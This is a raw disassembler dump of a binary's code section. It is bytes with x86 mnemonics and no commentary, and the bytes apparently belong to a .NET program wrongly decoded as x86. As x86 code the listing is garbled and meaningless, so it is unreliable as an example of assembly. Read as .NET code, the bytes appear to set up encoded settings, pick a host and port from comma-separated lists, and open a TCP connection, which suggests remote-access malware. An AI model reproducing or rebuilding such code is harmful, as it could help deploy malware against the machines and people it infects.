  4025e6:	7a 03                	jp     0x4025eb
  4025e8:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4025eb:	00 00                	add    %al,(%eax)
  4025ed:	02 20                	add    (%eax),%ah
  4025ef:	c3                   	ret
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	00 6f ee             	add    %ch,-0x12(%edi)
  4025f5:	00 00                	add    %al,(%eax)
  4025f7:	0a 2a                	or     (%edx),%ch
  4025f9:	02 20                	add    (%eax),%ah
  4025fb:	c2 00 00             	ret    $0x0
  4025fe:	00 6f ee             	add    %ch,-0x12(%edi)
  402601:	00 00                	add    %al,(%eax)
  402603:	0a 2a                	or     (%edx),%ch
  402605:	00 00                	add    %al,(%eax)
  402607:	00 1b                	add    %bl,(%ebx)
  402609:	30 02                	xor    %al,(%edx)
  40260b:	00 c5                	add    %al,%ch
  40260d:	00 00                	add    %al,(%eax)
  40260f:	00 01                	add    %al,(%ecx)
  402611:	00 00                	add    %al,(%eax)
  402613:	11 16                	adc    %edx,(%esi)
  402615:	0a 38                	or     (%eax),%bh
  402617:	0e                   	push   %cs
  402618:	00 00                	add    %al,(%eax)
  40261a:	00 20                	add    %ah,(%eax)
  40261c:	e8 03 00 00 28       	call   0x28402624
  402621:	14 00                	adc    $0x0,%al
  402623:	00 0a                	add    %cl,(%edx)
  402625:	06                   	push   %es
  402626:	17                   	pop    %ss
  402627:	58                   	pop    %eax
  402628:	0a 06                	or     (%esi),%al
  40262a:	7e 11                	jle    0x40263d
  40262c:	00 00                	add    %al,(%eax)
  40262e:	04 28                	add    $0x28,%al
  402630:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  402635:	e5 28                	in     $0x28,%eax
  402637:	03 00                	add    (%eax),%eax
  402639:	00 06                	add    %al,(%esi)
  40263b:	3a 06                	cmp    (%esi),%al
  40263d:	00 00                	add    %al,(%eax)
  40263f:	00 16                	add    %dl,(%esi)
  402641:	28 16                	sub    %dl,(%esi)
  402643:	00 00                	add    %al,(%eax)
  402645:	0a 00                	or     (%eax),%al
  402647:	28 36                	sub    %dh,(%esi)
  402649:	00 00                	add    %al,(%eax)
  40264b:	06                   	push   %es
  40264c:	3a 06                	cmp    (%esi),%al
  40264e:	00 00                	add    %al,(%eax)
  402650:	00 16                	add    %dl,(%esi)
  402652:	28 16                	sub    %dl,(%esi)
  402654:	00 00                	add    %al,(%eax)
  402656:	0a 7e 0c             	or     0xc(%esi),%bh
  402659:	00 00                	add    %al,(%eax)
  40265b:	04 28                	add    $0x28,%al
  40265d:	17                   	pop    %ss
  40265e:	00 00                	add    %al,(%eax)
  402660:	0a 39                	or     (%ecx),%bh
  402662:	05 00 00 00 28       	add    $0x28000000,%eax
  402667:	26 00 00             	add    %al,%es:(%eax)
  40266a:	06                   	push   %es
  40266b:	7e 04                	jle    0x402671
  40266d:	00 00                	add    %al,(%eax)
  40266f:	04 28                	add    $0x28,%al
  402671:	17                   	pop    %ss
  402672:	00 00                	add    %al,(%eax)
  402674:	0a 39                	or     (%ecx),%bh
  402676:	05 00 00 00 28       	add    $0x28000000,%eax
  40267b:	24 00                	and    $0x0,%al
  40267d:	00 06                	add    %al,(%esi)
  40267f:	7e 0f                	jle    0x402690
  402681:	00 00                	add    %al,(%eax)
  402683:	04 28                	add    $0x28,%al
  402685:	17                   	pop    %ss
  402686:	00 00                	add    %al,(%eax)
  402688:	0a 39                	or     (%ecx),%bh
  40268a:	0f 00 00             	sldt   (%eax)
  40268d:	00 28                	add    %ch,(%eax)
  40268f:	30 00                	xor    %al,(%eax)
  402691:	00 06                	add    %al,(%esi)
  402693:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  402699:	3f                   	aas
  40269a:	00 00                	add    %al,(%eax)
  40269c:	06                   	push   %es
  40269d:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4026a0:	00 06                	add    %al,(%esi)
  4026a2:	dd 06                	fldl   (%esi)
  4026a4:	00 00                	add    %al,(%eax)
  4026a6:	00 26                	add    %ah,(%esi)
  4026a8:	dd 00                	fldl   (%eax)
  4026aa:	00 00                	add    %al,(%eax)
  4026ac:	00 00                	add    %al,(%eax)
  4026ae:	28 12                	sub    %dl,(%edx)
  4026b0:	00 00                	add    %al,(%eax)
  4026b2:	06                   	push   %es
  4026b3:	3a 0a                	cmp    (%edx),%cl
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	00 28                	add    %ch,(%eax)
  4026b9:	1e                   	push   %ds
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	06                   	push   %es
  4026bd:	28 1b                	sub    %bl,(%ebx)
  4026bf:	00 00                	add    %al,(%eax)
  4026c1:	06                   	push   %es
  4026c2:	dd 06                	fldl   (%esi)
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	00 26                	add    %ah,(%esi)
  4026c8:	dd 00                	fldl   (%eax)
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	00 20                	add    %ah,(%eax)
  4026ce:	88 13                	mov    %dl,(%ebx)
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4026d5:	00 0a                	add    %cl,(%edx)
  4026d7:	2b d4                	sub    %esp,%edx
  4026d9:	00 00                	add    %al,(%eax)
  4026db:	00 01                	add    %al,(%ecx)
  4026dd:	1c 00                	sbb    $0x0,%al
  4026df:	00 00                	add    %al,(%eax)
  4026e1:	00 33                	add    %dh,(%ebx)
  4026e3:	00 60 93             	add    %ah,-0x6d(%eax)
  4026e6:	00 06                	add    %al,(%esi)
  4026e8:	01 00                	add    %eax,(%eax)
  4026ea:	00 01                	add    %al,(%ecx)
  4026ec:	00 00                	add    %al,(%eax)
  4026ee:	9a 00 19 b3 00 06 01 	lcall  $0x106,$0xb31900
  4026f5:	00 00                	add    %al,(%eax)
  4026f7:	01 1b                	add    %ebx,(%ebx)
  4026f9:	30 02                	xor    %al,(%edx)
  4026fb:	00 2d 01 00 00 02    	add    %ch,0x2000001
  402701:	00 00                	add    %al,(%eax)
  402703:	11 28                	adc    %ebp,(%eax)
  402705:	19 00                	sbb    %eax,(%eax)
  402707:	00 0a                	add    %cl,(%edx)
  402709:	7e 07                	jle    0x402712
  40270b:	00 00                	add    %al,(%eax)
  40270d:	04 28                	add    $0x28,%al
  40270f:	1a 00                	sbb    (%eax),%al
  402711:	00 0a                	add    %cl,(%edx)
  402713:	6f                   	outsl  %ds:(%esi),(%dx)
  402714:	1b 00                	sbb    (%eax),%eax
  402716:	00 0a                	add    %cl,(%edx)
  402718:	80 07 00             	addb   $0x0,(%edi)
  40271b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40271e:	07                   	pop    %es
  40271f:	00 00                	add    %al,(%eax)
  402721:	04 73                	add    $0x73,%al
  402723:	4b                   	dec    %ebx
  402724:	00 00                	add    %al,(%eax)
  402726:	06                   	push   %es
  402727:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  40272e:	00 00                	add    %al,(%eax)
  402730:	04 7e                	add    $0x7e,%al
  402732:	01 00                	add    %eax,(%eax)
  402734:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402737:	4e                   	dec    %esi
  402738:	00 00                	add    %al,(%eax)
  40273a:	06                   	push   %es
  40273b:	80 01 00             	addb   $0x0,(%ecx)
  40273e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402741:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402746:	02 00                	add    (%eax),%al
  402748:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40274b:	4e                   	dec    %esi
  40274c:	00 00                	add    %al,(%eax)
  40274e:	06                   	push   %es
  40274f:	80 02 00             	addb   $0x0,(%edx)
  402752:	00 04 7e             	add    %al,(%esi,%edi,2)
  402755:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40275a:	03 00                	add    (%eax),%eax
  40275c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40275f:	4e                   	dec    %esi
  402760:	00 00                	add    %al,(%eax)
  402762:	06                   	push   %es
  402763:	80 03 00             	addb   $0x0,(%ebx)
  402766:	00 04 7e             	add    %al,(%esi,%edi,2)
  402769:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40276e:	04 00                	add    $0x0,%al
  402770:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402773:	4e                   	dec    %esi
  402774:	00 00                	add    %al,(%eax)
  402776:	06                   	push   %es
  402777:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  40277b:	04 7e                	add    $0x7e,%al
  40277d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402782:	08 00                	or     %al,(%eax)
  402784:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402787:	4e                   	dec    %esi
  402788:	00 00                	add    %al,(%eax)
  40278a:	06                   	push   %es
  40278b:	80 08 00             	orb    $0x0,(%eax)
  40278e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402791:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402796:	0e                   	push   %cs
  402797:	00 00                	add    %al,(%eax)
  402799:	04 6f                	add    $0x6f,%al
  40279b:	4e                   	dec    %esi
  40279c:	00 00                	add    %al,(%eax)
  40279e:	06                   	push   %es
  40279f:	80 0e 00             	orb    $0x0,(%esi)
  4027a2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027aa:	0c 00                	or     $0x0,%al
  4027ac:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027af:	4e                   	dec    %esi
  4027b0:	00 00                	add    %al,(%eax)
  4027b2:	06                   	push   %es
  4027b3:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  4027b7:	04 7e                	add    $0x7e,%al
  4027b9:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027be:	0f 00 00             	sldt   (%eax)
  4027c1:	04 6f                	add    $0x6f,%al
  4027c3:	4e                   	dec    %esi
  4027c4:	00 00                	add    %al,(%eax)
  4027c6:	06                   	push   %es
  4027c7:	80 0f 00             	orb    $0x0,(%edi)
  4027ca:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027cd:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027d2:	12 00                	adc    (%eax),%al
  4027d4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027d7:	4e                   	dec    %esi
  4027d8:	00 00                	add    %al,(%eax)
  4027da:	06                   	push   %es
  4027db:	80 12 00             	adcb   $0x0,(%edx)
  4027de:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027e1:	2d 00 00 06 80       	sub    $0x80060000,%eax
  4027e6:	10 00                	adc    %al,(%eax)
  4027e8:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027eb:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027f0:	0a 00                	or     (%eax),%al
  4027f2:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027f5:	4e                   	dec    %esi
  4027f6:	00 00                	add    %al,(%eax)
  4027f8:	06                   	push   %es
  4027f9:	80 0a 00             	orb    $0x0,(%edx)
  4027fc:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027ff:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402804:	09 00                	or     %eax,(%eax)
  402806:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402809:	4e                   	dec    %esi
  40280a:	00 00                	add    %al,(%eax)
  40280c:	06                   	push   %es
  40280d:	28 1a                	sub    %bl,(%edx)
  40280f:	00 00                	add    %al,(%eax)
  402811:	0a 73 1c             	or     0x1c(%ebx),%dh
  402814:	00 00                	add    %al,(%eax)
  402816:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  40281c:	28 04 00             	sub    %al,(%eax,%eax,1)
  40281f:	00 06                	add    %al,(%esi)
  402821:	0a dd                	or     %ch,%bl
  402823:	08 00                	or     %al,(%eax)
  402825:	00 00                	add    %al,(%eax)
  402827:	26 16                	es push %ss
  402829:	0a dd                	or     %ch,%bl
  40282b:	00 00                	add    %al,(%eax)
  40282d:	00 00                	add    %al,(%eax)
  40282f:	06                   	push   %es
  402830:	2a 00                	sub    (%eax),%al
  402832:	00 00                	add    %al,(%eax)
  402834:	41                   	inc    %ecx
  402835:	1c 00                	sbb    $0x0,%al
	...
  40283f:	00 23                	add    %ah,(%ebx)
  402841:	01 00                	add    %eax,(%eax)
  402843:	00 23                	add    %ah,(%ebx)
  402845:	01 00                	add    %eax,(%eax)
  402847:	00 08                	add    %cl,(%eax)
  402849:	00 00                	add    %al,(%eax)
  40284b:	00 01                	add    %al,(%ecx)
  40284d:	00 00                	add    %al,(%eax)
  40284f:	01 1b                	add    %ebx,(%ebx)
  402851:	30 04 00             	xor    %al,(%eax,%eax,1)
  402854:	51                   	push   %ecx
  402855:	00 00                	add    %al,(%eax)
  402857:	00 02                	add    %al,(%edx)
  402859:	00 00                	add    %al,(%eax)
  40285b:	11 7e 0b             	adc    %edi,0xb(%esi)
  40285e:	00 00                	add    %al,(%eax)
  402860:	04 6f                	add    $0x6f,%al
  402862:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402867:	1e                   	push   %ds
  402868:	00 00                	add    %al,(%eax)
  40286a:	0a 74 2f 00          	or     0x0(%edi,%ebp,1),%dh
  40286e:	00 01                	add    %al,(%ecx)
  402870:	28 19                	sub    %bl,(%ecx)
  402872:	00 00                	add    %al,(%eax)
  402874:	0a 7e 07             	or     0x7(%esi),%bh
  402877:	00 00                	add    %al,(%eax)
  402879:	04 6f                	add    $0x6f,%al
  40287b:	1f                   	pop    %ds
  40287c:	00 00                	add    %al,(%eax)
  40287e:	0a 28                	or     (%eax),%ch
  402880:	53                   	push   %ebx
  402881:	00 00                	add    %al,(%eax)
  402883:	06                   	push   %es
  402884:	72 01                	jb     0x402887
  402886:	00 00                	add    %al,(%eax)
  402888:	70 28                	jo     0x4028b2
  40288a:	20 00                	and    %al,(%eax)
  40288c:	00 0a                	add    %cl,(%edx)
  40288e:	7e 0a                	jle    0x40289a
  402890:	00 00                	add    %al,(%eax)
  402892:	04 28                	add    $0x28,%al
  402894:	1a 00                	sbb    (%eax),%al
  402896:	00 0a                	add    %cl,(%edx)
  402898:	6f                   	outsl  %ds:(%esi),(%dx)
  402899:	21 00                	and    %eax,(%eax)
  40289b:	00 0a                	add    %cl,(%edx)
  40289d:	0a dd                	or     %ch,%bl
  40289f:	08 00                	or     %al,(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	26 16                	es push %ss
  4028a5:	0a dd                	or     %ch,%bl
  4028a7:	00 00                	add    %al,(%eax)
  4028a9:	00 00                	add    %al,(%eax)
  4028ab:	06                   	push   %es
  4028ac:	2a 00                	sub    (%eax),%al
  4028ae:	00 00                	add    %al,(%eax)
  4028b0:	01 10                	add    %edx,(%eax)
  4028b2:	00 00                	add    %al,(%eax)
  4028b4:	00 00                	add    %al,(%eax)
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	47                   	inc    %edi
  4028b9:	47                   	inc    %edi
  4028ba:	00 08                	add    %cl,(%eax)
  4028bc:	31 00                	xor    %eax,(%eax)
  4028be:	00 01                	add    %al,(%ecx)
  4028c0:	13 30                	adc    (%eax),%esi
  4028c2:	01 00                	add    %eax,(%eax)
  4028c4:	9d                   	popf
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	00 00                	add    %al,(%eax)
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 72 0f             	add    %dh,0xf(%edx)
  4028ce:	00 00                	add    %al,(%eax)
  4028d0:	70 80                	jo     0x402852
  4028d2:	01 00                	add    %eax,(%eax)
  4028d4:	00 04 72             	add    %al,(%edx,%esi,2)
  4028d7:	6a 01                	push   $0x1
  4028d9:	00 70 80             	add    %dh,-0x80(%eax)
  4028dc:	02 00                	add    (%eax),%al
  4028de:	00 04 72             	add    %al,(%edx,%esi,2)
  4028e1:	45                   	inc    %ebp
  4028e2:	02 00                	add    (%eax),%al
  4028e4:	70 80                	jo     0x402866
  4028e6:	03 00                	add    (%eax),%eax
  4028e8:	00 04 72             	add    %al,(%edx,%esi,2)
  4028eb:	f8                   	clc
  4028ec:	02 00                	add    (%eax),%al
  4028ee:	70 80                	jo     0x402870
  4028f0:	04 00                	add    $0x0,%al
  4028f2:	00 04 72             	add    %al,(%edx,%esi,2)
  4028f5:	ab                   	stos   %eax,%es:(%edi)
  4028f6:	03 00                	add    (%eax),%eax
  4028f8:	70 80                	jo     0x40287a
  4028fa:	05 00 00 04 72       	add    $0x72040000,%eax
  4028ff:	bf 03 00 70 80       	mov    $0x80700003,%edi
  402904:	06                   	push   %es
  402905:	00 00                	add    %al,(%eax)
  402907:	04 72                	add    $0x72,%al
  402909:	e7 03                	out    %eax,$0x3
  40290b:	00 70 80             	add    %dh,-0x80(%eax)
  40290e:	07                   	pop    %es
  40290f:	00 00                	add    %al,(%eax)
  402911:	04 72                	add    $0x72,%al
  402913:	41                   	inc    %ecx
  402914:	04 00                	add    $0x0,%al
  402916:	70 80                	jo     0x402898
  402918:	08 00                	or     %al,(%eax)
  40291a:	00 04 72             	add    %al,(%edx,%esi,2)
  40291d:	f4                   	hlt
  40291e:	04 00                	add    $0x0,%al
  402920:	70 80                	jo     0x4028a2
  402922:	09 00                	or     %eax,(%eax)
  402924:	00 04 72             	add    %al,(%edx,%esi,2)
  402927:	4f                   	dec    %edi
  402928:	17                   	pop    %ss
  402929:	00 70 80             	add    %dh,-0x80(%eax)
  40292c:	0a 00                	or     (%eax),%al
  40292e:	00 04 72             	add    %al,(%edx,%esi,2)
  402931:	02 1f                	add    (%edi),%bl
  402933:	00 70 80             	add    %dh,-0x80(%eax)
  402936:	0c 00                	or     $0x0,%al
  402938:	00 04 72             	add    %al,(%edx,%esi,2)
  40293b:	b5 1f                	mov    $0x1f,%ch
  40293d:	00 70 80             	add    %dh,-0x80(%eax)
  402940:	0e                   	push   %cs
  402941:	00 00                	add    %al,(%eax)
  402943:	04 72                	add    $0x72,%al
  402945:	68 20 00 70 80       	push   $0x80700020
  40294a:	0f 00 00             	sldt   (%eax)
  40294d:	04 14                	add    $0x14,%al
  40294f:	80 10 00             	adcb   $0x0,(%eax)
  402952:	00 04 72             	add    %al,(%edx,%esi,2)
  402955:	1b 21                	sbb    (%ecx),%esp
  402957:	00 70 80             	add    %dh,-0x80(%eax)
  40295a:	11 00                	adc    %eax,(%eax)
  40295c:	00 04 72             	add    %al,(%edx,%esi,2)
  40295f:	1f                   	pop    %ds
  402960:	21 00                	and    %eax,(%eax)
  402962:	70 80                	jo     0x4028e4
  402964:	12 00                	adc    (%eax),%al
  402966:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402969:	00 00                	add    %al,(%eax)
  40296b:	00 1b                	add    %bl,(%ebx)
  40296d:	30 07                	xor    %al,(%edi)
  40296f:	00 f1                	add    %dh,%cl
  402971:	02 00                	add    (%eax),%al
  402973:	00 03                	add    %al,(%ebx)
  402975:	00 00                	add    %al,(%eax)
  402977:	11 18                	adc    %ebx,(%eax)
  402979:	17                   	pop    %ss
  40297a:	1c 73                	sbb    $0x73,%al
  40297c:	22 00                	and    (%eax),%al
  40297e:	00 0a                	add    %cl,(%edx)
  402980:	25 20 00 c8 00       	and    $0xc80020,%eax
  402985:	00 6f 23             	add    %ch,0x23(%edi)
  402988:	00 00                	add    %al,(%eax)
  40298a:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402990:	00 6f 24             	add    %ch,0x24(%edi)
  402993:	00 00                	add    %al,(%eax)
  402995:	0a 28                	or     (%eax),%ch
  402997:	07                   	pop    %es
  402998:	00 00                	add    %al,(%eax)
  40299a:	06                   	push   %es
  40299b:	7e 0e                	jle    0x4029ab
  40299d:	00 00                	add    %al,(%eax)
  40299f:	04 72                	add    $0x72,%al
  4029a1:	fa                   	cli
  4029a2:	21 00                	and    %eax,(%eax)
  4029a4:	70 28                	jo     0x4029ce
  4029a6:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4029ab:	e3 00                	jecxz  0x4029ad
  4029ad:	00 00                	add    %al,(%eax)
  4029af:	7e 02                	jle    0x4029b3
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	04 17                	add    $0x17,%al
  4029b5:	8d 39                	lea    (%ecx),%edi
  4029b7:	00 00                	add    %al,(%eax)
  4029b9:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c0:	26 00 00             	add    %al,%es:(%eax)
  4029c3:	0a 73 27             	or     0x27(%ebx),%dh
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	0a 7e 02             	or     0x2(%esi),%bh
  4029cb:	00 00                	add    %al,(%eax)
  4029cd:	04 17                	add    $0x17,%al
  4029cf:	8d 39                	lea    (%ecx),%edi
  4029d1:	00 00                	add    %al,(%eax)
  4029d3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4029da:	26 00 00             	add    %al,%es:(%eax)
  4029dd:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  4029e3:	00 0a                	add    %cl,(%edx)
  4029e5:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  4029ec:	17                   	pop    %ss
  4029ed:	8d 39                	lea    (%ecx),%edi
  4029ef:	00 00                	add    %al,(%eax)
  4029f1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029f8:	26 00 00             	add    %al,%es:(%eax)
  4029fb:	0a 73 27             	or     0x27(%ebx),%dh
  4029fe:	00 00                	add    %al,(%eax)
  402a00:	0a 7e 01             	or     0x1(%esi),%bh
  402a03:	00 00                	add    %al,(%eax)
  402a05:	04 17                	add    $0x17,%al
  402a07:	8d 39                	lea    (%ecx),%edi
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  402a11:	6f                   	outsl  %ds:(%esi),(%dx)
  402a12:	26 00 00             	add    %al,%es:(%eax)
  402a15:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  402a1b:	00 0a                	add    %cl,(%edx)
  402a1d:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  402a24:	06                   	push   %es
  402a25:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402a28:	00 06                	add    %al,(%esi)
  402a2a:	39 52 00             	cmp    %edx,0x0(%edx)
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	06                   	push   %es
  402a30:	28 29                	sub    %ch,(%ecx)
  402a32:	00 00                	add    %al,(%eax)
  402a34:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402a37:	0d 38 39 00 00       	or     $0x3938,%eax
  402a3c:	00 08                	add    %cl,(%eax)
  402a3e:	09 a3 32 00 00 01    	or     %esp,0x1000032(%ebx)
  402a44:	13 04 28             	adc    (%eax,%ebp,1),%eax
  402a47:	06                   	push   %es
  402a48:	00 00                	add    %al,(%eax)
  402a4a:	06                   	push   %es
  402a4b:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402a4e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4f:	2a 00                	sub    (%eax),%al
  402a51:	00 0a                	add    %cl,(%edx)
  402a53:	28 06                	sub    %al,(%esi)
  402a55:	00 00                	add    %al,(%eax)
  402a57:	06                   	push   %es
  402a58:	6f                   	outsl  %ds:(%esi),(%dx)
  402a59:	2b 00                	sub    (%eax),%eax
  402a5b:	00 0a                	add    %cl,(%edx)
  402a5d:	39 05 00 00 00 dd    	cmp    %eax,0xdd000000
  402a63:	c3                   	ret
  402a64:	00 00                	add    %al,(%eax)
  402a66:	00 dd                	add    %bl,%ch
  402a68:	06                   	push   %es
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	00 26                	add    %ah,(%esi)
  402a6d:	dd 00                	fldl   (%eax)
  402a6f:	00 00                	add    %al,(%eax)
  402a71:	00 09                	add    %cl,(%ecx)
  402a73:	17                   	pop    %ss
  402a74:	58                   	pop    %eax
  402a75:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402a7a:	32 c1                	xor    %cl,%al
  402a7c:	38 a9 00 00 00 28    	cmp    %ch,0x28000000(%ecx)
  402a82:	06                   	push   %es
  402a83:	00 00                	add    %al,(%eax)
  402a85:	06                   	push   %es
  402a86:	06                   	push   %es
  402a87:	07                   	pop    %es
  402a88:	6f                   	outsl  %ds:(%esi),(%dx)
  402a89:	2c 00                	sub    $0x0,%al
  402a8b:	00 0a                	add    %cl,(%edx)
  402a8d:	38 98 00 00 00 73    	cmp    %bl,0x73000000(%eax)
  402a93:	2d 00 00 0a 13       	sub    $0x130a0000,%eax
  402a98:	05 72 04 22 00       	add    $0x220472,%eax
  402a9d:	70 72                	jo     0x402b11
  402a9f:	04 22                	add    $0x22,%al
  402aa1:	00 70 73             	add    %dh,0x73(%eax)
  402aa4:	2e 00 00             	add    %al,%cs:(%eax)
  402aa7:	0a 13                	or     (%ebx),%dl
  402aa9:	06                   	push   %es
  402aaa:	11 05 11 06 6f 2f    	adc    %eax,0x2f6f0611
  402ab0:	00 00                	add    %al,(%eax)
  402ab2:	0a 11                	or     (%ecx),%dl
  402ab4:	05 7e 0e 00 00       	add    $0xe7e,%eax
  402ab9:	04 6f                	add    $0x6f,%al
  402abb:	30 00                	xor    %al,(%eax)
  402abd:	00 0a                	add    %cl,(%edx)
  402abf:	17                   	pop    %ss
  402ac0:	8d 38                	lea    (%eax),%edi
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	01 25 16 72 06 22    	add    %esp,0x22067216
  402aca:	00 70 a2             	add    %dh,-0x5e(%eax)
  402acd:	16                   	push   %ss
  402ace:	6f                   	outsl  %ds:(%esi),(%dx)
  402acf:	31 00                	xor    %eax,(%eax)
  402ad1:	00 0a                	add    %cl,(%edx)
  402ad3:	13 07                	adc    (%edi),%eax
  402ad5:	11 07                	adc    %eax,(%edi)
  402ad7:	16                   	push   %ss
  402ad8:	a3 38 00 00 01       	mov    %eax,0x1000038
  402add:	80 02 00             	addb   $0x0,(%edx)
  402ae0:	00 04 11             	add    %al,(%ecx,%edx,1)
  402ae3:	07                   	pop    %es
  402ae4:	73 27                	jae    0x402b0d
  402ae6:	00 00                	add    %al,(%eax)
  402ae8:	0a 17                	or     (%edi),%dl
  402aea:	11 07                	adc    %eax,(%edi)
  402aec:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402aef:	32 00                	xor    (%eax),%al
  402af1:	00 0a                	add    %cl,(%edx)
  402af3:	a3 38 00 00 01       	mov    %eax,0x1000038
  402af8:	80 01 00             	addb   $0x0,(%ecx)
  402afb:	00 04 28             	add    %al,(%eax,%ebp,1)
  402afe:	06                   	push   %es
  402aff:	00 00                	add    %al,(%eax)
  402b01:	06                   	push   %es
  402b02:	7e 02                	jle    0x402b06
  402b04:	00 00                	add    %al,(%eax)
  402b06:	04 7e                	add    $0x7e,%al
  402b08:	01 00                	add    %eax,(%eax)
  402b0a:	00 04 28             	add    %al,(%eax,%ebp,1)
  402b0d:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402b12:	2c 00                	sub    $0x0,%al
  402b14:	00 0a                	add    %cl,(%edx)
  402b16:	dd 0f                	fisttpll (%edi)
  402b18:	00 00                	add    %al,(%eax)
  402b1a:	00 11                	add    %dl,(%ecx)
  402b1c:	05 39 07 00 00       	add    $0x739,%eax
  402b21:	00 11                	add    %dl,(%ecx)
  402b23:	05 6f 33 00 00       	add    $0x336f,%eax
  402b28:	0a dc                	or     %ah,%bl
  402b2a:	28 06                	sub    %al,(%esi)
  402b2c:	00 00                	add    %al,(%eax)
  402b2e:	06                   	push   %es
  402b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b30:	2b 00                	sub    (%eax),%eax
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	39 18                	cmp    %ebx,(%eax)
  402b36:	01 00                	add    %eax,(%eax)
  402b38:	00 17                	add    %dl,(%edi)
  402b3a:	28 13                	sub    %dl,(%ebx)
  402b3c:	00 00                	add    %al,(%eax)
  402b3e:	06                   	push   %es
  402b3f:	28 06                	sub    %al,(%esi)
  402b41:	00 00                	add    %al,(%eax)
  402b43:	06                   	push   %es
  402b44:	17                   	pop    %ss
  402b45:	73 34                	jae    0x402b7b
  402b47:	00 00                	add    %al,(%eax)
  402b49:	0a 16                	or     (%esi),%dl
  402b4b:	14 fe                	adc    $0xfe,%al
  402b4d:	06                   	push   %es
  402b4e:	1d 00 00 06 73       	sbb    $0x73060000,%eax
  402b53:	35 00 00 0a 73       	xor    $0x730a0000,%eax
  402b58:	36 00 00             	add    %al,%ss:(%eax)
  402b5b:	0a 28                	or     (%eax),%ch
  402b5d:	09 00                	or     %eax,(%eax)
  402b5f:	00 06                	add    %al,(%esi)
  402b61:	28 08                	sub    %cl,(%eax)
  402b63:	00 00                	add    %al,(%eax)
  402b65:	06                   	push   %es
  402b66:	28 06                	sub    %al,(%esi)
  402b68:	00 00                	add    %al,(%eax)
  402b6a:	06                   	push   %es
  402b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b6c:	37                   	aaa
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	0a 6f 38             	or     0x38(%edi),%ch
  402b72:	00 00                	add    %al,(%eax)
  402b74:	0a 17                	or     (%edi),%dl
  402b76:	8d 39                	lea    (%ecx),%edi
  402b78:	00 00                	add    %al,(%eax)
  402b7a:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402b80:	6f                   	outsl  %ds:(%esi),(%dx)
  402b81:	26 00 00             	add    %al,%es:(%eax)
  402b84:	0a 16                	or     (%esi),%dl
